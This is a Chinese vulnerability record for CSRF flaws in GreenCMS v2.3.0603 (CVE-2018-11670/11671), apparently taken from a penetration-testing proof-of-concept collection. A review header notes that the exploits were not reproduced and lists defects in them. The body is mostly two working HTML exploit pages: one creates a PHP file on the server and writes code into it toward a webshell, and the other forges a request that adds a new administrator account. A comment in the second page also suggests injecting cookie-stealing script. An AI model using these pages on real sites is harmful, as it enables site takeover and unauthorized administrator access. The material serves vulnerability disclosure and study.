---
cve: "CVE-2018-11670; CVE-2018-11671"
source: "Mr-xn/Penetration_Testing_POC"
product: "GreenCMS2.3.0603"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2018-11670; CVE-2018-11671"
referenced_identifiers: ""
identifier_role: "primary"
identifier_status: "unknown"
title: "GreenCMS v2.3.0603存在CSRF漏洞可获取webshell&增加管理员账户2"
prerequisites: "来源所述条件，未列明部分仍待核：已登录有媒体写入/新增管理员权限的受害者；跨站Cookie；手动提交按钮"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-0338a61a51e80b0b5e143776"
entity_id: "ve-0338a61a51e80b0b5e143776"
schema_version: "1"
---

## 核对与使用边界

- 明确更正：CSRF 需要已登录且有相应管理权限的受害者访问攻击页面；两个漏洞 CVE-2018-11670/11671 应分别关联 issue108/109，不共用一次未证明的成功链。
- 原表单没有自动提交，mkfile 的 GET 与 put 的 POST 先后完成未证；外围 span、全角空白、邮箱 value 中 `%40` 再编码问题均按坏样本保留，附注 CSRF+XSS 没有独立 XSS 证据。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：已登录有媒体写入/新增管理员权限的受害者；跨站Cookie；手动提交按钮

- **结论使用边界（1）**：frontmatter漏11671，需两实体分别关联官方issue108/109。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（2）**：概述省略已登录受害者；表单非自动提交，mkfile脚本GET与put POST先后成功未证实。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **实验改动边界（3）**：HTML代码有span外围和全角空白，邮箱value写123%40Qq.com会二次编码成字面%40；注释另称CSRF+XSS未给独立证据。以下步骤按原实验条件保留；人工改动后的行为只支持该修改环境，不用于证明未修改发行版默认可利用。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# GreenCMS v2.3.0603存在CSRF漏洞可获取webshell&增加管理员账户2

### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|GreenCMS v2.3.0603存在CSRF漏洞可获取webshell&增加管理员账户|2018-06-02|惜潮|[https://github.com/GreenCMS/GreenCMS](https://github.com/GreenCMS/GreenCMS) | [https://github.com/GreenCMS/GreenCMS](https://github.com/GreenCMS/GreenCMS) |v2.3.0603| [CVE-2018-11670](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11670)/[CVE-2018-11671](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11671)|  

#### 漏洞概述  

> 恶意攻击者可以精心伪造一个Html页面 从而获取网站webshell。GreenCMS是一个在github上开源的CMS系统，漏洞发现者已经将漏洞信息通过[issues](https://github.com/GreenCMS/GreenCMS/issues/108)/[issues](https://github.com/GreenCMS/GreenCMS/issues/109)告知作者。   


### POC实现代码如下：  

> 从CSRF到get webshell 的exp代码如下：  

``` html
<span style="font-size:18px;"><!DOCTYPE html> 
<html lang="en"> 
<head> 
    <meta charset="UTF-8"> 
    <title>csrf测试</title> 
</head> 
<form action="http://127.0.0.1//14/index.php?m=admin&c=media&a=fileconnect" method="POST" id="transfer" name="transfer">
    <!-- 下面的是生成文件名为xc.php的脚本文件 路径 127.0.0.1/Upload/xc.php -->
    <script src="http://127.0.0.1/14/index.php?m=admin&c=media&a=fileconnect&cmd=mkfile&name=xc.php&target=l1_XA&_=1527839615462"></script>
    <input type="hidden" name="cmd" value="put">
    <input type="hidden" name="target" value="l1_eGMucGhw">
　    <input type="hidden" name="content" value="<?php phpinfo();?>">
    <!-- 下面的是提交表单 将content中的命令写入脚本内 -->
    <button type="submit" value="Submit">WebShell</button>
    </form>
    </body>
</html></span>
```
> 从CSRF到增加管理员 的exp代码如下：  

``` html
<span style="font-size:18px;"><!DOCTYPE html>  
<html lang="en">  
<head>  
    <meta charset="UTF-8">  
    <title>csrf测试</title>  
</head>  
　　<body>  
    　　　　<form action="http://127.0.0.1//14/index.php?m=admin&c=access&a=adduserhandle" method="POST" id="transfer" name="transfer">  
　　　　　　　　<input type="hidden" name="user_id0" value="1">  
　　　　　　　　<input type="hidden" name="user_login" value="test1">  <!--在这里可以添加JS脚本用于获取cookies  csrf+xss-->
　　　　　　　　<input type="hidden" name="password" value="test1">  
　　　　　　　　<input type="hidden" name="rpassword" value="test1">  
　　　　　　　　<input type="hidden" name="user_nicename" value="123">  
　　　　　　　　<input type="hidden" name="user_email" value="123%40Qq.com">  
　　　　　　　　<input type="hidden" name="user_url" value="www.baidu.com">  
　　　　　　　　<input type="hidden" name="user_intro" value="test">  
　　　　　　　　<input type="hidden" name="user_status" value="1">  
　　　　　　　　<input type="hidden" name="role_id" value="1">
        <button type="submit" value="Submit">添加管理员</button>  
　　　　　　</form>  
    </body>
</html></span>
```


---

> 来源：Mr-xn/Penetration_Testing_POC
